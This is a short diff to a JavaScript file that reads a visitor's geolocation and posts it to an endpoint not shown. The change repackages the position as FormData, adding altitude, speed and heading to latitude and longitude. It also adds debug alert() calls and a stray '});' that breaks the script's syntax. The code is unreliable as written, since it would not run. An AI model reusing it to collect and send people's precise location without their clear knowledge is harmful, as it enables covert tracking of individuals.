@@ -20,6 +20,7 @@ async function sendRequest(data) {
         headers: { "Content-Type": "text/plain" },
         body: data
       });
+      alert(typeof(data))
       alert(response)
       if (response.ok) break;
     } catch (err) {
@@ -33,7 +34,15 @@ async function sendRequest(data) {
 async function dgree() {
   try {
     const pos = await getLocation();
-    const data = `Latitude= ${pos.coords.latitude}, Longitude= ${pos.coords.longitude} (Accuracy= ${pos.coords.accuracy}m)`;
+    const data = new FormData();
+    
+    data.append("Latitude", pos.coords.latitude);
+    data.append("Longitude", pos.coords.longitude);
+    data.append("Accuracy", pos.coords.accuracy);
+    data.append("Altitude", pos.coords.altitude);
+    data.append("Speed", pos.coords.speed);
+    data.append("Heading", pos.coords.heading);
+});
     await sendRequest(data);
   } catch (err) {
     
